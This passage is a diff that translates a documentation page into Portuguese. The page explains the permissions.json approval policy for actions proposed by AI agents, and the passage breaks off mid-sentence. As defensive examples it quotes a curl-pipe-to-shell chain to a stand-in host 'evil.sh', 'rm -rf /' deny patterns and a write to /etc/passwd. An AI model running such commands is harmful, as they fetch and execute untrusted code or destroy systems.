@@ -1,23 +1,22 @@
 ---
 id: permissions
-title: Permissions
-sidebar_label: Permissions
+title: Permissões
+sidebar_label: Permissões
 sidebar_position: 3
-description: The format of permissions.json, how a pattern matches a command, and the exact order in which the decision is made.
+description: O formato do permissions.json, como um padrão casa com um comando e a ordem exata em que a decisão é tomada.
 keywords: [permissions.json, approval, policy, deny, allow, proposed_action]
-idioma_original: en
 ---
 
-# Permissions
+# Permissões
 
-Every action with an external effect is born as a `proposed_action` and goes
-through here before executing. This page is the exact format and semantics —
-the rules themselves are in [Business rules](../business-rules/api.md#rn-004).
+Toda ação com efeito externo nasce como `proposed_action` e passa por aqui
+antes de executar. Esta página é o formato e a semântica exatos — as regras
+em si estão em [Regras de negócio](../business-rules/api.md#rn-004).
 
-## The file
+## O arquivo
 
-`permissions.json` lives at the **root of the project workspace** — it's a
-real file on disk, versionable, not a column in the database.
+`permissions.json` mora na **raiz do workspace do projeto** — é um arquivo
+real em disco, versionável, não uma coluna no banco.
 
 ```json
 {
@@ -27,45 +26,44 @@ real file on disk, versionable, not a column in the database.
 }
 ```
 
-Three lists, three meanings:
+Três listas, três significados:
 
-| list | meaning |
+| lista | significado |
 |---|---|
-| `allow` | `auto_approve` — the action executes without asking |
-| `deny` | `deny` — refused, and nothing reverts this |
-| `ask` | `require_approval` — goes to the approval queue |
+| `allow` | `auto_approve` — a ação executa sem perguntar |
+| `deny` | `deny` — recusada, e nada reverte isso |
+| `ask` | `require_approval` — vai para a fila de aprovação |
 
-No list matches? The action stays `pending` by default. **The absence of a
-rule never becomes a permission.**
+Nenhuma lista casa? A ação fica `pending` por padrão. **A ausência de regra
+nunca vira permissão.**
 
-### With which credential the auto-approved action executes
+### Com qual credencial a ação auto-aprovada executa
 
-`auto_approve` means **nobody decided** — `proposed_actions.decided_by`
-stays `NULL`. This matters for who executes: a git action against a remote
-provider needs a token, and "the token of whoever decided" doesn't exist on
-this path.
+`auto_approve` quer dizer que **ninguém decidiu** —
+`proposed_actions.decided_by` fica `NULL`. Isso importa para quem executa:
+uma ação de git contra um provider remoto precisa de um token, e "o token de
+quem decidiu" não existe neste caminho.
 
-The answer is the **workspace owner** ([RN-082](../business-rules/api.md#rn-082)),
-the same one as the LLM key ([RN-058](../business-rules/api.md#rn-058)) —
-whoever funds the account funds the agents, and that doesn't change based on
-who clicks.
+A resposta é o **owner do workspace** ([RN-082](../business-rules/api.md#rn-082)),
+o mesmo da chave de LLM ([RN-058](../business-rules/api.md#rn-058)) — quem
+financia a conta financia os agentes, e isso não muda conforme quem clica.
 
-It's worth knowing because the alternative fails silently: while the api
-resolved by `decided_by`, **every auto-approved PR on a remote repository
-died** with `Requires authentication`, and only when a human clicked each
-one did the path work — exactly the ladder that autonomy exists to avoid.
+Vale saber porque a alternativa falha calada: enquanto a api resolvia por
+`decided_by`, **toda PR auto-aprovada em repositório remoto morria** com
+`Requires authentication`, e só quando um humano clicava em cada uma o
+caminho funcionava — exatamente a escada que a autonomia existe para evitar.
 
-## The pattern format
+## O formato do padrão
 
 ```
 Label(content)
 ```
 
-The label is the action type in PascalCase. The content is only used for
-`Terminal`; in the other types it needs to be **empty** — `GitPush()`
-matches any push, and `GitPush(algo)` matches nothing.
+O rótulo é o tipo de ação em PascalCase. O conteúdo só é usado em
+`Terminal`; nos outros tipos ele precisa ser **vazio** — `GitPush()` casa com
+qualquer push, e `GitPush(algo)` não casa com nada.
 
-| action type | label | minimum role |
+| tipo de ação | rótulo | papel mínimo |
 |---|---|---|
 | `terminal` | `Terminal` | developer |
 | `git_commit` | `GitCommit` | developer |
@@ -88,141 +86,139 @@ matches any push, and `GitPush(algo)` matches nothing.
 | `container_remove` | `ContainerRemove` | maintainer |
 | `spend` | `Spend` | **owner** |
 
-The minimum role is checked **before** the file. Without it, `deny` —
-`permissions.json` cannot grant what IAM denies
+O papel mínimo é conferido **antes** do arquivo. Sem ele, `deny` — o
+`permissions.json` não concede o que o IAM nega
 
-`parallelize` (Phase 14d) is the only one whose effect isn't touching code
-or repository: it requests more AGENTS. It's at `maintainer` for the same
-reason as `spend` — whoever authorizes cost is whoever is accountable for
-the project. It only exists above the lead's cap; within it there's no
-action, because there's nothing to decide
+`parallelize` (Fase 14d) é o único cujo efeito não é tocar código ou
+repositório: ele pede mais AGENTES. Está em `maintainer` pelo mesmo motivo de
+`spend` — quem autoriza custo é quem responde pelo projeto. Ele só existe
+acima do teto do lead; dentro dele não há ação, porque não há nada a decidir
 ([RN-083](../business-rules/api.md#rn-083))
 ([RN-005](../business-rules/api.md#rn-005)).
 
 `propose_execution_plan` (ADR 0086, [RN-284](../business-rules/engine.md#rn-284))
-is the Dev Lead's plan — how many agents per module and why, before any of
-them come up. Same caliber as `parallelize`: a decision about HOW MUCH the
-product will spend on parallelism, just at the start instead of at a cap
-overrun. Unlike `parallelize`/`raise_max_parallel`, it is NOT in the
-absolute-caps block — it can be configured as `auto_approve`, like
-`open_adr_pr`/`open_infra_pr` — and while it's `pending`, the Dev Lead's
-turn stays SUSPENDED waiting for the decision, not just the conversation
-stalled.
+é o plano do Dev Lead — quantos agentes por módulo e por quê, antes de
+qualquer um deles subir. Mesmo calibre de `parallelize`: uma decisão sobre
+QUANTO o produto vai gastar em paralelismo, só que no começo em vez de no
+estouro de um teto. Diferente de `parallelize`/`raise_max_parallel`, ele NÃO
+está no bloco de tetos absolutos — pode ser configurado como `auto_approve`,
+como `open_adr_pr`/`open_infra_pr` — e enquanto está `pending`, o turno do Dev
+Lead fica SUSPENSO esperando a decisão, não só a conversa parada.
 
 `assess_implementability` (ADR 0090, [RN-340](../business-rules/api.md#rn-340))
-is the implementability assessment of a story (gate `implementavel`,
-`config/gates.yml`) — SAME caliber and SAME reasoning as
-`propose_execution_plan`: an initial session decision, not a cap overrun,
-and therefore also outside the absolute-caps block. It suspends the Dev
-Lead's turn the same way while `pending`.
+é a avaliação de implementabilidade de uma história (gate `implementavel`,
+`config/gates.yml`) — MESMO calibre e MESMO raciocínio de
+`propose_execution_plan`: uma decisão inicial da sessão, não um estouro de
+teto, e por isso também fora do bloco de tetos absolutos. Ela suspende o turno
+do Dev Lead do mesmo jeito enquanto está `pending`.
 
-`container_stop` and `container_remove` (ADR 0136,
-[RN-495](../business-rules/api.md#rn-495)) are the two actions the global
-containers page (`/containers`) proposes when someone clicks "Stop" or
-"Remove" on a project's row — always a human, never an agent. Both are
-`maintainer`, same as `container_start`: whoever is accountable for the
-project's infra decides. `container_stop` follows `container_start`'s
-calibration — it CAN be configured `auto_approve` — except for the seed:
-`container_stop` is never seeded, while `container_start` is seeded
-`auto_approve` for the Infra agent when its handoff is accepted (ADR 0190,
-[RN-671](../business-rules/api.md#rn-671)). That seed is what lets the start the
-Infra Lead's SERVER proposes on that accept run without a second click; the
-`maintainer` minimum, the mode/state refusals and the no-broker 409 all still
-apply before it.
-`container_remove` cannot: it discards the container and forces a full
-reprovision, and is in the absolute-caps block below, same treatment as
-external-effect git/privileged commands.
+`container_stop` e `container_remove` (ADR 0136,
+[RN-495](../business-rules/api.md#rn-495)) são as duas ações que a página global
+de containers (`/containers`) propõe quando alguém clica em "Parar" ou
+"Remover" na linha de um projeto — sempre um humano, nunca um agente. As duas
+são `maintainer`, como `container_start`: decide quem responde pela infra do
+projeto. `container_stop` segue a calibragem de `container_start` — PODE ser
+configurada `auto_approve` — exceto pela semeadura: `container_stop` nunca é
+semeada, enquanto `container_start` é semeada `auto_approve` para o agente de
+Infra quando o handoff dele é aceito (ADR 0190,
+[RN-671](../business-rules/api.md#rn-671)). É essa semeadura que deixa a subida
+que o SERVIDOR do Infra Lead propõe nesse aceite rodar sem um segundo clique;
+o mínimo `maintainer`, as recusas por modo/estado e o 409 sem broker continuam
+valendo antes dela.
+`container_remove` não pode: ela descarta o container e força um
+reprovisionamento completo, e está no bloco de tetos absolutos abaixo, mesmo
+tratamento de git com efeito externo/comandos privilegiados.
 
-**None of the three cares WHERE the container comes up.** `decide()` and
-every rule above are agnostic of `executionMode` — the branch only exists
-in EXECUTION, after approval (`ExecuteContainerStartUseCase`/
-`ExecuteContainerStopUseCase`/`ExecuteContainerRemoveUseCase`): a
-`container` project's approved action still goes to the broker
-(`ContainerBrokerPort`, unchanged); a `mounted`/`runner` project's goes to
-the RUNNER connected to the project instead, over the Phoenix channel it
-already keeps ([RN-497](../business-rules/produto.md#rn-497),
-[ADR 0137](../adr/0137-o-runner-sobe-o-container-do-projeto.md)). "No
-runner connected" and "the runner tried and refused" are both ordinary
-`failed` outcomes, same discipline as a broker refusal — never an
-uncaught exception.
+**Nenhuma das três se importa com ONDE o container sobe.** `decide()` e todas
+as regras acima ignoram o `executionMode` — a ramificação só existe na
+EXECUÇÃO, depois da aprovação (`ExecuteContainerStartUseCase`/
+`ExecuteContainerStopUseCase`/`ExecuteContainerRemoveUseCase`): a ação
+aprovada de um projeto `container` continua indo para o broker
+(`ContainerBrokerPort`, sem mudança); a de um projeto `mounted`/`runner` vai,
+em vez disso, para o RUNNER conectado ao projeto, pelo canal Phoenix que ele
+já mantém ([RN-497](../business-rules/produto.md#rn-497),
+[ADR 0137](../adr/0137-o-runner-sobe-o-container-do-projeto.md)). "Nenhum
+runner conectado" e "o runner tentou e recusou" são os dois desfechos `failed`
+comuns, mesma disciplina de uma recusa do broker — nunca uma exceção não
+tratada.
 
-**One more thing happens in `container_start` execution, and only for
+**Mais uma coisa acontece na execução de `container_start`, e só em
 `mounted`** ([RN-501](../business-rules/api.md#rn-501),
-[ADR 0142](../adr/0142-validacao-de-workspace-montado-adiada.md)): the
-project's folder is MATERIALIZED there. Creating a `mounted` project no
-longer requires the folder to exist — creation validates only the path
-format plus `BRABO_PROJECTS_BASE` — because the product owner's requirement
-is that the bind-mount be created AFTER the architect's decision, and
-`container_start` is the first moment that qualifies. So the executor
-`mkdir -p`s the folder, proves it writable from inside the api, and stamps
-`workspace_verified_at`, all BEFORE any lifecycle transition. A folder the
-api cannot create or reach is a NAMED `failed` — it names the variable, the
-path, the likely cause (folder ownership on the host; images run non-root,
-ADR 0024) and the next step — and the lifecycle row is **not** marked
-`provisioning`: marking it and only then finding out you cannot write would
-leave `project_containers` asserting a state that never existed. None of
-this touches `decide()`, the caps, or who may approve.
+[ADR 0142](../adr/0142-validacao-de-workspace-montado-adiada.md)): a pasta do
+projeto é MATERIALIZADA ali. Criar um projeto `mounted` não exige mais que a
+pasta exista — a criação valida só o formato do caminho mais a
+`BRABO_PROJECTS_BASE` — porque o requisito do dono do produto é que o
+bind-mount seja criado DEPOIS da decisão do Arquiteto, e `container_start` é o
+primeiro momento que se qualifica. Então o executor faz `mkdir -p` da pasta,
+prova que ela é gravável de dentro da api e carimba `workspace_verified_at`,
+tudo ANTES de qualquer transição de ciclo de vida. Uma pasta que a api não
+consegue criar ou alcançar é um `failed` NOMEADO — nomeia a variável, o
+caminho, a causa provável (dono da pasta no host; as imagens rodam
+non-root, ADR 0024) e o próximo passo — e a linha do ciclo de vida **não** é
+marcada `provisioning`: marcá-la e só então descobrir que não dá para escrever
+deixaria `project_containers` afirmando um estado que nunca existiu. Nada disso
+toca `decide()`, os tetos ou quem pode aprovar.
 
-**And `container_start` resolves its resources there**
+**E `container_start` resolve os recursos dele ali**
 ([RN-683](../business-rules/api.md#rn-683),
-[ADR 0199](../adr/0199-recurso-minimo-derivado-do-module-map.md)): a field
-the proposal OMITS — every field, in the server's start on handoff acceptance
-— becomes the MINIMUM derived from the current `module_map` (the sum of what
-each module declared, floored at today's default while any module declared
-nothing); a field BELOW that minimum is a named `failed`, recorded before any
-image decision or lifecycle transition; above it, the usual ceiling applies.
-Like the folder materialization, this is execution, not policy: `decide()`
-and who may approve do not change.
+[ADR 0199](../adr/0199-recurso-minimo-derivado-do-module-map.md)): um campo
+que a proposta OMITE — todos, na subida do servidor no aceite do handoff —
+vira o MÍNIMO derivado do `module_map` vigente (a soma do que cada módulo
+declarou, com piso no padrão de hoje enquanto algum módulo não declarou nada);
+um campo ABAIXO desse mínimo é um `failed` nomeado, gravado antes de qualquer
+decisão de imagem ou transição de ciclo de vida; acima dele, vale o teto de
+sempre. Como a materialização da pasta, isto é execução, não política:
+`decide()` e quem pode aprovar não mudam.
 
-## How a pattern matches a command
+## Como um padrão casa com um comando
 
-Not by substring. The command is tokenized with shell rules and the pattern
-matches by **token prefix**:
+Não por substring. O comando é tokenizado com as regras do shell e o padrão
+casa por **prefixo de token**:
 
-| pattern | command | matches? |
+| padrão | comando | casa? |
 |---|---|---|
 | `Terminal(pnpm test)` | `pnpm test` | ✅ |
-| `Terminal(pnpm test)` | `pnpm test --watch` | ✅ (prefix) |
+| `Terminal(pnpm test)` | `pnpm test --watch` | ✅ (prefixo) |
 | `Terminal(pnpm test)` | `pnpm build` | ❌ |
-| `Terminal(pnpm test:*)` | `pnpm test:unit` | ✅ (`*` at the end of the token) |
-| `Terminal(rm)` | `sudo rm -rf x` | ❌ — `rm` is not the first token |
+| `Terminal(pnpm test:*)` | `pnpm test:unit` | ✅ (`*` no fim do token) |
+| `Terminal(rm)` | `sudo rm -rf x` | ❌ — `rm` não é o primeiro token |
 
-The `*` applies **inside a token**, at the end. It's not a path glob:
-`Terminal(rm -rf /*)` matches the literal token `/*`, not "anything under
-`/`".
+O `*` vale **dentro de um token**, no fim. Não é glob de caminho:
+`Terminal(rm -rf /*)` casa com o token literal `/*`, não com "qualquer coisa
+abaixo de `/`".
 
-Environment variables are preserved literally: `$HOME` stays `$HOME` in the
-match, instead of expanding to empty — expanding would silently change what
-is being compared.
+Variáveis de ambiente são preservadas literalmente: `$HOME` continua `$HOME`
+no casamento, em vez de expandir para vazio — expandir mudaria em silêncio o
+que está sendo comparado.
 
-## Compound command
+## Comando composto
 
-A command with `&&`, `;`, `|`, `||` or `&` is split into segments, and
-**each segment is evaluated separately**:
+Um comando com `&&`, `;`, `|`, `||` ou `&` é dividido em segmentos, e **cada
+segmento é avaliado separadamente**:
 
-- Any segment in `deny` → the whole command is `deny`.
-- **All** segments in `allow` → `auto_approve`.
-- Any other combination → `require_approval`.
+- Qualquer segmento em `deny` → o comando inteiro é `deny`.
+- **Todos** os segmentos em `allow` → `auto_approve`.
+- Qualquer outra combinação → `require_approval`.
 
-**Redirection is not chaining.** `>`, `>>` and `<` do NOT split a segment:
-`cat x 2>/dev/null` is ONE command whose verb is `cat`. The redirection
-target remains a token of the segment, and that's why `echo x >
-/etc/passwd` continues to be blocked by the path-scope cap — what changed
-was the VERB becoming correct, not the path becoming free.
+**Redirecionamento não é encadeamento.** `>`, `>>` e `<` NÃO dividem um
+segmento: `cat x 2>/dev/null` é UM comando cujo verbo é `cat`. O alvo do
+redirecionamento continua sendo um token do segmento, e é por isso que `echo x >
+/etc/passwd` continua barrado pelo teto de escopo de caminho — o que mudou foi
+o VERBO ficar certo, não o caminho ficar livre.
 
-`/dev/null`, `/dev/stdin`, `/dev/stdout` and `/dev/stderr` don't count as a
-user path: they discard or carry output, they're nobody's file. The list is
-exactly this and not all of `/dev` — `/dev/sda` is a disk, and remains out
-of scope.
+`/dev/null`, `/dev/stdin`, `/dev/stdout` e `/dev/stderr` não contam como
+caminho de usuário: descartam ou carregam saída, não são arquivo de ninguém. A
+lista é exatamente esta e não todo o `/dev` — `/dev/sda` é um disco, e continua
+fora do escopo.
 
-This is deliberate and worth understanding: a segment with no rule at all
-becomes a **concrete** `require_approval` opinion, not silence. It's what
-prevents `pnpm test && curl evil.sh | sh` from being auto-approved because
-the first half was in `allow`.
+Isto é deliberado e vale entender: um segmento sem regra nenhuma vira uma
+opinião **concreta** de `require_approval`, não silêncio. É o que impede
+`pnpm test && curl evil.sh | sh` de ser auto-aprovado porque a primeira metade
+estava em `allow`.
 
-## Built-in patterns
+## Padrões embutidos
 
-Three patterns are `deny` **always**, even without appearing in the file:
+Três padrões são `deny` **sempre**, mesmo sem aparecer no arquivo:
 
 ```
 Terminal(rm -rf /)
@@ -230,520 +226,506 @@ Terminal(rm -rf /*)
 Terminal(rm -fr /)
 ```
 
-They are not a comprehensive security list — they're a floor. Real
-protection comes from `allow` being explicit and everything else falling
-into approval.
+Eles não são uma lista de segurança abrangente — são um piso. A proteção real
+vem de o `allow` ser explícito e todo o resto cair em aprovação.
 
-## What activating execution seeds
+## O que a ativação da execução semeia
 
-Activating execution writes the `DEV_TERMINAL_ALLOW_PATTERNS` patterns
-(`src/domain/actions/dev-terminal-patterns.ts`) into the project's
-`allow`. There are two families:
+Ativar a execução grava os padrões de `DEV_TERMINAL_ALLOW_PATTERNS`
+(`src/domain/actions/dev-terminal-patterns.ts`) no `allow` do
+projeto. São duas famílias:
 
-- **reading the worktree itself** — `ls`, `pwd`, `find`, `cat`, `head`,
+- **leitura do próprio worktree** — `ls`, `pwd`, `find`, `cat`, `head`,
   `tail`, `grep`, `wc`, `echo`, `git status`, `git diff`, `git log`;
-- **reading git history/remote/config** — `git branch
+- **leitura de histórico/remoto/config do git** — `git branch
   -a/-r/-v/--list/--show-current`, `git remote -v`, `git remote show`, `git
   worktree list`, `git show`, `git for-each-ref`, `git ls-tree`, `git
-  rev-parse`, `git config --get` (see [RN-143](../business-rules/api.md#rn-143));
-- **build and test** — `pnpm install`, `pnpm test`, `npm run`, `npx
-  vitest`, `mix test`, `pytest`, `go test`, `cargo test`, among others.
+  rev-parse`, `git config --get` (veja a [RN-143](../business-rules/api.md#rn-143));
+- **build e teste** — `pnpm install`, `pnpm test`, `npm run`, `npx
+  vitest`, `mix test`, `pytest`, `go test`, `cargo test`, entre outros.
 
-The third family exists because `ReportDone` only allows opening a PR after
-a `terminal` with `exit 0` in the history. The first exists because the
-agent **looks before it builds**: without it, every `ls -la` in a newly
-provisioned repository fell into approval, came back as `status pending` —
-and not as the command's output — and burned a ToolLoop iteration until the
-task died by limit (see [RN-068](../business-rules/api.md#rn-068)). The second
-exists because `git status`/`diff`/`log` are enough to look at the
-worktree, but not for the agent to orient itself in the history and remotes
-of a newly adopted repository — a real session spent dozens of manual
-approvals on subcommands like `git branch -a` or `git worktree list` that
-fell outside `allow` and pushed to manual approval any compound command
-they appeared in.
+A terceira família existe porque o `ReportDone` só deixa abrir PR depois de um
+`terminal` com `exit 0` no histórico. A primeira existe porque o agente
+**olha antes de construir**: sem ela, todo `ls -la` num repositório recém
+provisionado caía em aprovação, voltava como `status pending` — e não como a
+saída do comando — e queimava uma iteração do ToolLoop até a tarefa morrer por
+limite (veja a [RN-068](../business-rules/api.md#rn-068)). A segunda existe
+porque `git status`/`diff`/`log` bastam para olhar o worktree, mas não para o
+agente se orientar no histórico e nos remotos de um repositório recém adotado
+— uma sessão real gastou dezenas de aprovações manuais em subcomandos como
+`git branch -a` ou `git worktree list` que ficavam fora do `allow` e
+empurravam para aprovação manual todo comando composto em que apareciam.
 
-This does NOT loosen anything described above. It still holds that `deny`
-beats `allow`, that the built-in patterns remain active, that matching is
-by **token** prefix (`ls` allowed doesn't allow `lsof`), and that a
-compound command requires EVERY segment to match — so `ls && rm -rf /`
-doesn't pass because of the `ls`.
+Isto NÃO afrouxa nada do que está descrito acima. Continua valendo que `deny`
+vence `allow`, que os padrões embutidos seguem ativos, que o casamento é por
+prefixo de **token** (`ls` permitido não permite `lsof`), e que um comando
+composto exige que TODO segmento case — então `ls && rm -rf /` não passa por
+causa do `ls`.
 
-The second family requires extra care, because prefix matching allows
-ANYTHING after the prefix that matched: a bare pattern `Terminal(git
-branch)` would match both `git branch -D nome` (deletes) and `git branch
-nome-nova` (creates) as well as the plain listing, because it can't see
-what comes after. That's why `branch`, `remote`, `worktree` and `config` —
-the four that have a MUTATING sibling — only got in ANCHORED by the flag
-that makes the read unambiguous (`-a`/`-v`/`show`/`list`/`--get`), never by
-the bare verb; `git branch -D/-d/-m/-M`, `git remote add/remove/set-url`,
-`git worktree add/remove/prune` and `git config <chave> <valor>` (without
-`--get`) still require approval. `show`, `log`, `for-each-ref`, `ls-tree`
-and `rev-parse` didn't need an anchor: none of their continuations mutate
-the repository.
+A segunda família exige cuidado a mais, porque o casamento por prefixo permite
+QUALQUER coisa depois do prefixo que casou: um padrão nu `Terminal(git
+branch)` casaria tanto com `git branch -D nome` (apaga) quanto com `git branch
+nome-nova` (cria) além da listagem simples, porque não enxerga o que vem
+depois. Por isso `branch`, `remote`, `worktree` e `config` — os quatro que têm
+um irmão que MUTA — só entraram ANCORADOS pela flag que torna a leitura
+inequívoca (`-a`/`-v`/`show`/`list`/`--get`), nunca pelo verbo nu;
+`git branch -D/-d/-m/-M`, `git remote add/remove/set-url`,
+`git worktree add/remove/prune` e `git config <chave> <valor>` (sem `--get`)
+continuam exigindo aprovação. `show`, `log`, `for-each-ref`, `ls-tree` e
+`rev-parse` não precisaram de âncora: nenhuma continuação deles muta o
+repositório.
 
-Auto-approving `terminal` via `agent_autonomy` would be different and is
-not what's done: it would free up ANY command inside the engine container,
-with no file in the middle.
+Auto-aprovar `terminal` via `agent_autonomy` seria diferente e não é o que se
+faz: liberaria QUALQUER comando dentro do container do engine, sem arquivo no
+meio.
 
-## The complete decision order
+## A ordem completa da decisão
 
 ```mermaid
 flowchart TD
-  A[proposed_action] --> B{role >= minimum?}
-  B -->|no| D1[deny: insufficient IAM]
-  B -->|yes| C0{terminal, and project's<br/>real container running?}
-  C0 -->|yes| C1[base: auto_approve — RN-492/493]
-  C0 -->|no| C[base: require_approval]
-  C1 --> D{agent_autonomy has an opinion?}
+  A[proposed_action] --> B{papel >= mínimo?}
+  B -->|não| D1[deny: IAM insuficiente]
+  B -->|sim| C0{terminal, e o container real<br/>do projeto running?}
+  C0 -->|sim| C1[base: auto_approve — RN-492/493]
+  C0 -->|não| C[base: require_approval]
+  C1 --> D{agent_autonomy tem opinião?}
   C --> D
   D -->|deny| D2[deny]
-  D -->|other| E[adopts the opinion]
-  D -->|none| E2[keeps the base]
-  E --> F{permissions.json matches?}
+  D -->|outra| E[adota a opinião]
+  D -->|nenhuma| E2[mantém a base]
+  E --> F{permissions.json casa?}
   E2 --> F
   F -->|deny| D3[deny]
-  F -->|allow/ask| G[adopts the file's verdict]
-  F -->|none| G2[keeps the previous]
-  G --> S{terminal touches path<br/>outside the project folder?}
+  F -->|allow/ask| G[adota o veredito do arquivo]
+  F -->|nenhum| G2[mantém o anterior]
+  G --> S{terminal toca caminho<br/>fora da pasta do projeto?}
   G2 --> S
-  S -->|yes, and was auto_approve| I2[CAP: require_approval]
-  S -->|no| Z{git_push/pr_open, or terminal requests<br/>git push, PR, deploy, or sudo/doas?}
-  Z -->|yes, and was auto_approve| I3[CAP: require_approval — RN-418]
-  Z -->|no| H{merge into protected branch<br/>or instruction_patch?}
-  H -->|yes, and was auto_approve| I[CAP: require_approval]
-  H -->|no| J[final verdict]
+  S -->|sim, e era auto_approve| I2[TETO: require_approval]
+  S -->|não| Z{git_push/pr_open, ou terminal pede<br/>git push, PR, deploy ou sudo/doas?}
+  Z -->|sim, e era auto_approve| I3[TETO: require_approval — RN-418]
+  Z -->|não| H{merge em branch protegida<br/>ou instruction_patch?}
+  H -->|sim, e era auto_approve| I[TETO: require_approval]
+  H -->|não| J[veredito final]
 ```
 
-**Node `Z` changed position** ([RN-418](../business-rules/api.md#rn-418),
-revises [RN-106](../business-rules/api.md#rn-106)): until the introduction of
-the local runner, it sat right after IAM and returned `deny` — now it's a
-CAP, in the same final block as the other three, applied after
-`agent_autonomy` and `permissions.json` have already given their opinion.
-See the section
-["The boundary of external effect and privileged command"](#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418)
-below for why.
+**O nó `Z` mudou de posição** ([RN-418](../business-rules/api.md#rn-418), revisa
+a [RN-106](../business-rules/api.md#rn-106)): até a chegada do
+runner local, ele ficava logo depois do IAM e devolvia `deny` — agora é um
+TETO, no mesmo bloco final dos outros três, aplicado depois de
+`agent_autonomy` e `permissions.json` já terem opinado. Veja a seção
+["A fronteira de efeito externo e comando privilegiado"](#a-fronteira-de-efeito-externo-e-comando-privilegiado-rn-418)
+abaixo para o porquê.
 
-### "Auto mode": the `agent_autonomy` wildcard ([RN-153](../business-rules/api.md#rn-153))
+### "Modo automático": a curinga do `agent_autonomy` ([RN-153](../business-rules/api.md#rn-153))
 
-The `agent_autonomy has an opinion?` node in the diagram above doesn't
-know, and doesn't need to know, whether the opinion came from a SPECIFIC
-rule (`actionType: "terminal"`) or from the `actionType: "*"` wildcard —
-"auto mode": autonomy for ANY type of action by that agent, turned on with
-a click on "Automatic mode" in the `ApprovalCard`. The resolution happens
-BEFORE this diagram begins, in a single repository:
-`DrizzleAgentAutonomyRepository.findMode` looks up the specific rule and
-the wildcard in the same query, and returns the specific one when both
-exist — writing `terminal: deny` with `"*": auto_approve` turned on still
-denies `terminal` for that agent, while freeing up the rest.
+O nó `agent_autonomy tem opinião?` do diagrama acima não sabe, e não precisa
+saber, se a opinião veio de uma regra ESPECÍFICA (`actionType: "terminal"`) ou
+da curinga `actionType: "*"` — o "modo automático": autonomia para QUALQUER
+tipo de ação daquele agente, ligada com um clique em "Modo automático" no
+`ApprovalCard`. A resolução acontece ANTES de este diagrama começar, num
+repositório só: `DrizzleAgentAutonomyRepository.findMode` procura a regra
+específica e a curinga na mesma consulta, e devolve a específica quando as duas
+existem — gravar `terminal: deny` com `"*": auto_approve` ligado continua
+negando `terminal` para aquele agente, enquanto libera o resto.
 
-That's why the diagram didn't get a new node, and the caps, right below,
-apply to "auto mode" because they react to `current.policy ===
-'auto_approve'`, never to its origin
-([RN-154](../business-rules/api.md#rn-154)).
+Por isso o diagrama não ganhou nó novo, e os tetos, logo abaixo, valem para o
+"modo automático" porque reagem a `current.policy === 'auto_approve'`, nunca à
+origem dele ([RN-154](../business-rules/api.md#rn-154)).
 
-**One exception, decided by the product owner: auto mode frees the path
-scope** ([RN-603](../business-rules/api.md#rn-603),
-[ADR 0167](../adr/0167-modo-automatico-libera-o-escopo-de-caminho.md)).
-The repository also returns WHERE the autonomy came from
-(`AgentAutonomyRepository.resolve`: `especifica` or `curinga`), and
-`decide()` receives it as `ctx.autonomyOrigin`. When the wildcard resolves
-to `auto_approve`, two approval requests go away: the [path-scope
-cap](#path-scope) and the `require_approval` a compound command synthesises
-for a segment with no rule at all. So an agent in auto mode runs any
-terminal command, even outside the project folder — measured on `exp001`,
-47 of 51 requests after auto mode was on came only from the scope, because
-the dev agent runs inside the container (`/work`) and the scope compares
-against the HOST root. Everything else stays: `deny` wins, an `ask` written
-in the file asks, the external-effect/privileged cap (push, PR, deploy,
-`sudo`/`doas`) runs first and ignores the origin, and protected-branch
-merge, `instruction_patch`, parallelism and `container_remove` never
-auto-approve. A SPECIFIC rule (`terminal: auto_approve` or
-`terminal: require_approval`) is not auto mode and keeps the scope cap.
+**Uma exceção, decidida pelo dono do produto: o modo automático libera o
+escopo de caminho** ([RN-603](../business-rules/api.md#rn-603),
+[ADR 0167](../adr/0167-modo-automatico-libera-o-escopo-de-caminho.md)). O
+repositório devolve também DE ONDE a autonomia veio
+(`AgentAutonomyRepository.resolve`: `especifica` ou `curinga`), e `decide()` a
+recebe como `ctx.autonomyOrigin`. Quando a curinga resolve para
+`auto_approve`, dois pedidos de aprovação somem: o [teto de escopo de
+caminho](#path-scope) e o `require_approval` que um comando composto sintetiza
+para um segmento sem regra nenhuma. Então um agente em modo automático roda
+qualquer comando de terminal, mesmo fora da pasta do projeto — medido no
+`exp001`, 47 de 51 pedidos depois de o modo automático ser ligado vinham só do
+escopo, porque o dev agent roda dentro do container (`/work`) e o escopo
+compara com a raiz do HOST. Todo o resto fica: `deny` vence, um `ask` escrito
+no arquivo pergunta, o teto de efeito externo/privilegiado (push, PR, deploy,
+`sudo`/`doas`) roda primeiro e ignora a origem, e merge em branch protegida,
+`instruction_patch`, paralelismo e `container_remove` nunca auto-aprovam. Uma
+regra ESPECÍFICA (`terminal: auto_approve` ou `terminal: require_approval`)
+não é modo automático e mantém o teto de escopo.
 
-When a `git_merge` the human approved EXECUTES and the provider reports the PR
-as `merged`, the task that PR came from moves to `done` — once: a repeated merge
-of the same PR does not move it again or record a second
-`backlog.task_status_changed` event ([RN-628](../business-rules/api.md#rn-628)). The
-merge itself is never automated ([RN-418](../business-rules/api.md#rn-418)).
+Quando um `git_merge` que o humano aprovou EXECUTA e o provider informa a PR
+como `merged`, a tarefa de onde a PR veio passa a `done` — uma vez: um merge
+repetido da mesma PR não a move de novo nem grava um segundo evento
+`backlog.task_status_changed` ([RN-628](../business-rules/api.md#rn-628)). O merge
+em si nunca é automatizado ([RN-418](../business-rules/api.md#rn-418)).
 
-A `git_merge` is REFUSED before it is created when the same PR was already
-merged by an earlier execution (409 `pr_ja_mergeado`) or already has a live
-proposal — pending, approved or auto-approved (409 `merge_ja_proposto`); a
-denied or failed one does not block trying again. Approving a pending merge
-whose PR another proposal already merged is also 409 `pr_ja_mergeado`, and the
-action stays `pending`. A QA/SecOps gate still pending is NOT a refusal: the
-PRs tab and the chat only WARN, naming the gate, and the button stays enabled
+Um `git_merge` é RECUSADO antes de ser criado quando a mesma PR já foi mergeada
+por uma execução anterior (409 `pr_ja_mergeado`) ou já tem uma proposta viva —
+pendente, aprovada ou auto-aprovada (409 `merge_ja_proposto`); uma negada ou
+falhada não impede tentar de novo. Aprovar um merge pendente cuja PR outra
+proposta já mergeou também é 409 `pr_ja_mergeado`, e a ação fica `pending`. Um
+gate de QA/SecOps ainda pendente NÃO é recusa: a aba de PRs e o chat só
+AVISAM, nomeando o gate, e o botão fica habilitado
 ([RN-663](../business-rules/api.md#rn-663)).
 
-"Auto mode" requires `maintainer` — the same role that already protected
-`PUT .../agent-autonomy` before the wildcard existed. Turning it off
-reuses the manual/auto toggle the agent card already had in
-Overview/Executors: with the wildcard written, the toggle switches to
